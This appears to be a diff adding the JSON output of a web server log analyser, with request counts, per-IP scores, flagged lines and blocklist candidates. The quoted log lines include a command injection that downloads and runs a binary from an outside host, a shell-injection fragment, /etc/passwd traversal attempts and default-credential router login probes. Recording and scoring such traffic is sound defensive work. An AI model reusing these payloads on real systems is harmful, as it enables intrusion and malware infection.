@@ -1,0 +1,671 @@
+{
+  "total_lines": 307,
+  "categorized_lines": {
+    "ru_or_ua": 0,
+    "latin_only": 307,
+    "mixed": 0,
+    "unknown": 0
+  },
+  "top_source_ips": {
+    "45.205.1.8": 80,
+    "46.151.178.13": 15,
+    "179.43.146.226": 15,
+    "106.75.10.97": 8,
+    "45.79.152.14": 7,
+    "194.50.16.253": 7,
+    "37.120.213.13": 6,
+    "81.29.142.100": 6,
+    "106.75.2.237": 6,
+    "184.105.247.252": 6
+  },
+  "top_paths": {
+    "/": 179,
+    "unknown": 28,
+    "/favicon.ico": 14,
+    "/.git/config": 8,
+    "/SDK/webLanguage": 4,
+    "/cgi/conf.bin": 4,
+    "/.env": 4,
+    "/boaform/admin/formLogin?username=user&psd=user": 3,
+    "/../../../../../../etc/passwd": 3,
+    "*": 3
+  },
+  "top_suspicious_paths": {
+    "/boaform/admin/formLogin?username=user&psd=user": 3,
+    "/../../../../../../etc/passwd": 3,
+    "/login.cgi?cli=aa": 1,
+    "/admin/config.php": 1,
+    "/login": 1
+  },
+  "suspicious_keyword_hits": {
+    "admin": 7,
+    "login": 5,
+    "passwd": 3
+  },
+  "request_anomalies": {
+    "non_http_request": 21,
+    "malformed_request": 5,
+    "empty_request": 2
+  },
+  "ip_scores": {
+    "18.116.101.220": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "204.76.203.206": {
+      "requests": 4,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "37.120.213.13": {
+      "requests": 6,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "46.151.178.13": {
+      "requests": 15,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "135.237.124.11": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "38.127.60.25": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "77.83.39.84": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "93.174.93.12": {
+      "requests": 3,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "45.205.1.8": {
+      "requests": 80,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "44.220.188.120": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "110.37.66.78": {
+      "requests": 1,
+      "suspicious_hits": 1,
+      "score": 1.0
+    },
+    "34.140.171.60": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "198.235.24.90": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "71.6.232.28": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "45.79.152.14": {
+      "requests": 7,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "71.239.37.238": {
+      "requests": 1,
+      "suspicious_hits": 1,
+      "score": 1.0
+    },
+    "167.250.224.25": {
+      "requests": 1,
+      "suspicious_hits": 1,
+      "score": 1.0
+    },
+    "66.240.205.34": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "20.163.60.170": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "103.42.243.35": {
+      "requests": 1,
+      "suspicious_hits": 1,
+      "score": 1.0
+    },
+    "203.55.131.5": {
+      "requests": 4,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "117.205.162.74": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "188.166.21.171": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "45.91.64.7": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "8.216.43.98": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "5.61.209.107": {
+      "requests": 4,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "154.242.255.186": {
+      "requests": 1,
+      "suspicious_hits": 1,
+      "score": 1.0
+    },
+    "194.50.16.253": {
+      "requests": 7,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "81.29.142.100": {
+      "requests": 6,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "89.248.173.217": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "20.64.105.237": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "64.62.156.66": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "194.164.107.4": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "91.98.29.29": {
+      "requests": 3,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "20.163.15.225": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "176.65.149.253": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "20.65.193.90": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "34.52.186.237": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "147.185.132.15": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "195.178.110.159": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "5.187.35.26": {
+      "requests": 1,
+      "suspicious_hits": 1,
+      "score": 1.0
+    },
+    "51.159.23.43": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "94.26.68.13": {
+      "requests": 2,
+      "suspicious_hits": 2,
+      "score": 1.0
+    },
+    "172.94.9.253": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "167.94.146.50": {
+      "requests": 5,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "121.101.129.39": {
+      "requests": 3,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "5.187.35.142": {
+      "requests": 2,
+      "suspicious_hits": 2,
+      "score": 1.0
+    },
+    "193.124.20.243": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "193.124.20.249": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "193.124.20.252": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "194.88.98.92": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "194.88.98.84": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "135.237.81.94": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "147.224.137.108": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "106.75.10.97": {
+      "requests": 8,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "106.75.2.237": {
+      "requests": 6,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "147.185.132.223": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "34.23.213.254": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "34.77.166.77": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "64.62.156.10": {
+      "requests": 3,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "184.105.247.252": {
+      "requests": 6,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "64.62.156.15": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "64.62.156.17": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "64.62.156.16": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "93.123.109.62": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "139.59.58.140": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "66.132.195.39": {
+      "requests": 4,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "193.124.20.244": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "193.176.31.150": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "193.176.31.153": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "193.176.31.152": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "71.6.232.30": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "45.148.10.67": {
+      "requests": 4,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "185.189.182.234": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "172.235.40.131": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "179.43.146.226": {
+      "requests": 15,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "199.45.154.123": {
+      "requests": 4,
+      "suspicious_hits": 1,
+      "score": 0.25
+    },
+    "195.211.191.112": {
+      "requests": 6,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "176.32.193.16": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "115.133.247.67": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "187.191.2.214": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "213.209.159.175": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "77.83.39.94": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "142.93.242.137": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "192.253.248.169": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "8.228.39.199": {
+      "requests": 2,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "124.198.131.162": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "160.119.76.40": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "3.131.220.121": {
+      "requests": 6,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "13.222.169.249": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "13.218.97.192": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "100.55.25.236": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "98.89.3.242": {
+      "requests": 1,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "80.66.83.43": {
+      "requests": 1,
+      "suspicious_hits": 1,
+      "score": 1.0
+    },
+    "152.32.208.9": {
+      "requests": 5,
+      "suspicious_hits": 0,
+      "score": 0.0
+    },
+    "203.154.2.6": {
+      "requests": 3,
+      "suspicious_hits": 0,
+      "score": 0.0
+    }
+  },
+  "suspicious_lines": [
+    {
+      "ip": "110.37.66.78",
+      "path": "/boaform/admin/formLogin?username=user&psd=user",
+      "category": "latin_only",
+      "keywords": [
+        "admin",
+        "login"
+      ],
+      "line": "110.37.66.78 - - [20/Apr/2026:01:11:19 +0300] \"GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0\" 301 162 \"-\" \"-\""
+    },
+    {
+      "ip": "71.239.37.238",
+      "path": "/login.cgi?cli=aa",
+      "category": "latin_only",
+      "keywords": [
+        "login"
+      ],
+      "line": "71.239.37.238 - - [20/Apr/2026:03:25:11 +0300] \"GET /login.cgi?cli=aa%20aa%27;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27$ HTTP/1.1\" 400 150 \"-\" \"r00ts3c\""
+    },
+    {
+      "ip": "167.250.224.25",
+      "path": "/admin/config.php",
+      "category": "latin_only",
+      "keywords": [
+        "admin"
+      ],
+      "line": "167.250.224.25 - - [20/Apr/2026:03:48:07 +0300] \"GET /admin/config.php HTTP/1.0\" 301 162 \"-\" \"xfa1\""
+    },
+    {
+      "ip": "103.42.243.35",
+      "path": "/boaform/admin/formLogin?username=user&psd=user",
+      "category": "latin_only",
+      "keywords": [
+        "admin",
+        "login"
+      ],
+      "line": "103.42.243.35 - - [20/Apr/2026:04:35:22 +0300] \"GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0\" 301 162 \"-\" \"-\""
+    },
+    {
+      "ip": "154.242.255.186",
+      "path": "/boaform/admin/formLogin?username=user&psd=user",
+      "category": "latin_only",
+      "keywords": [
+        "admin",
+        "login"
+      ],
+      "line": "154.242.255.186 - - [20/Apr/2026:06:07:25 +0300] \"GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0\" 301 162 \"-\" \"-\""
+    },
+    {
+      "ip": "5.187.35.26",
+      "path": "/../../../../../../etc/passwd",
+      "category": "latin_only",
+      "keywords": [
+        "passwd"
+      ],
+      "line": "5.187.35.26 - - [20/Apr/2026:08:53:23 +0300] \"GET /..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\" 400 150 \"-\" \"-\""
+    },
+    {
+      "ip": "94.26.68.13",
+      "path": "unknown",
+      "category": "latin_only",
+      "keywords": [
+        "admin"
+      ],
+      "line": "94.26.68.13 - - [20/Apr/2026:09:11:23 +0300] \"\\x03\\x00\\x00/*\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Administr\" 400 150 \"-\" \"-\""
+    },
+    {
+      "ip": "5.187.35.142",
+      "path": "/../../../../../../etc/passwd",
+      "category": "latin_only",
+      "keywords": [
+        "passwd"
+      ],
+      "line": "5.187.35.142 - - [20/Apr/2026:10:45:57 +0300] \"GET /..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\" 400 150 \"-\" \"-\""
+    },
+    {
+      "ip": "5.187.35.142",
+      "path": "/../../../../../../etc/passwd",
+      "category": "latin_only",
+      "keywords": [
+        "passwd"
+      ],
+      "line": "5.187.35.142 - - [20/Apr/2026:10:45:58 +0300] \"GET /..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\" 400 150 \"-\" \"-\""
+    },
+    {
+      "ip": "94.26.68.13",
+      "path": "unknown",
+      "category": "latin_only",
+      "keywords": [
+        "admin"
+      ],
+      "line": "94.26.68.13 - - [20/Apr/2026:10:58:12 +0300] \"\\x03\\x00\\x00/*\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Administr\" 400 150 \"-\" \"-\""
+    },
+    {
+      "ip": "199.45.154.123",
+      "path": "/login",
+      "category": "latin_only",
+      "keywords": [
+        "login"
+      ],
+      "line": "199.45.154.123 - - [20/Apr/2026:16:26:12 +0300] \"GET /login HTTP/1.1\" 404 184 \"-\" \"Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)\""
+    },
+    {
+      "ip": "80.66.83.43",
+      "path": "unknown",
+      "category": "latin_only",
+      "keywords": [
+        "admin"
+      ],
+      "line": "80.66.83.43 - - [20/Apr/2026:21:29:01 +0300] \"\\x03\\x00\\x00/*\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Administr\" 400 150 \"-\" \"-\""
+    }
+  ],
+  "unknown_path_examples": [
+    "18.116.101.220 - - [20/Apr/2026:00:00:16 +0300] \"\" 400 0 \"-\" \"-\"",
+    "18.116.101.220 - - [20/Apr/2026:00:01:32 +0300] \"\\x16\\x03\\x01\\x00{\\x01\\x00\\x00w\\x03\\x03\\xA8\\x8E\\xC0x\\xCF\\xF1\\x9Ci*\\x11\\x1EW\\x0F\\xC12\\xE2NL\\xD5\\x11p\\x04\\xF7\\xAB\\x80\\xCF\\x82\\x87\\x1A\" 400 150 \"-\" \"-\"",
+    "93.174.93.12 - - [20/Apr/2026:03:45:35 +0300] \"\\x16\\x03\\x02\\x01o\\x01\\x00\\x01k\\x03\\x02RH\\xC5\\x1A#\\xF7:N\\xDF\\xE2\\xB4\\x82/\\xFF\\x09T\\x9F\\xA7\\xC4y\\xB0h\\xC6\\x13\\x8C\\xA4\\x1C=\\x22\\xE1\\x1A\\x98 \\x84\\xB4,\\x85\\xAFn\\xE3Y\\xBBbhl\\xFF(=':\\xA9\\x82\\xD9o\\xC8\\xA2\\xD7\\x93\\x98\\xB4\\xEF\\x80\\xE5\\xB9\\x90\\x00(\\xC0\" 400 150 \"-\" \"-\"",
+    "66.240.205.34 - - [20/Apr/2026:04:07:40 +0300] \"145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==\" 400 150 \"-\" \"-\"",
+    "20.163.60.170 - - [20/Apr/2026:04:34:18 +0300] \"MGLNDD_84.251.101.42_443\" 400 150 \"-\" \"-\"",
+    "203.55.131.5 - - [20/Apr/2026:04:58:20 +0300] \"\\x16\\x03\\x01\\x00\\xEC\\x01\\x00\\x00\\xE8\\x03\\x03\\xCB\\x05pi\\x84[\\xB6\\x06\\x05\\xF5\\xFC\\xEA,\\xD4\\xD1\\xC9\\x8B\\xE6/&w\\xE7$\\x90_B~\\xF0\\x0F\\xF8\\x12\\xA2 +7d\\xE67q?1\\x1DQ\\xED\\xFFh/=\\xCE\\xB5\\xFA-3:$\\x0F\\x87)\\xBC{W$\\xF5a\\xA9\\x00 JJ\\x13\\x01\\x13\\x02\\x13\\x03\\xC0+\\xC0/\\xC0,\\xC00\\xCC\\xA9\\xCC\\xA8\\xC0\\x13\\xC0\\x14\\x00\\x9C\\x00\\x9D\\x00/\\x005\\x01\\x00\\x00\\x7F\\x00\\x05\\x00\\x05\\x01\\x00\\x00\\x00\\x00\\x00\" 400 150 \"-\" \"-\"",
+    "117.205.162.74 - - [20/Apr/2026:05:15:59 +0300] \";sh+/tmp/gpon80&ipv=0\" 400 150 \"-\" \"-\"",
+    "203.55.131.5 - - [20/Apr/2026:05:17:19 +0300] \"\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x03!\\x83d\\x8A%\\x1D&\\x10N\\xA2\\xB3\\x85d\\xEE6\\xC1\\x96\\x08\\xAD\\xEB@i\\x22U\\xE7\\x07P\\xDB\\xBC\\x8D\\xF3\\xA4 5+\\xC45VKH\\x85\\xDF\\xBF}b\\xFCV\\xC1;P\\xB5\\xF4\\xE3\\x89\\x06\\x02\\x95\\x80\\x08>\\xD0\\x19\\xCC\\xC6\\xE6\\x00>\\x13\\x02\\x13\\x03\\x13\\x01\\xC0,\\xC00\\x00\\x9F\\xCC\\xA9\\xCC\\xA8\\xCC\\xAA\\xC0+\\xC0/\\x00\\x9E\\xC0$\\xC0(\\x00k\\xC0#\\xC0'\\x00g\\xC0\" 400 150 \"-\" \"-\"",
+    "8.216.43.98 - - [20/Apr/2026:05:47:29 +0300] \"\\xD9\\x00\\x00\\x00\" 400 150 \"-\" \"-\"",
+    "20.64.105.237 - - [20/Apr/2026:06:42:36 +0300] \"SSH-2.0-Go\" 400 150 \"-\" \"-\""
+  ],
+  "blocklist_candidates": {
+    "94.26.68.13": {
+      "requests": 2,
+      "suspicious_hits": 2,
+      "score": 1.0,
+      "reason": "multiple suspicious hits"
+    },
+    "5.187.35.142": {
+      "requests": 2,
+      "suspicious_hits": 2,
+      "score": 1.0,
+      "reason": "multiple suspicious hits"
+    }
+  }
+}
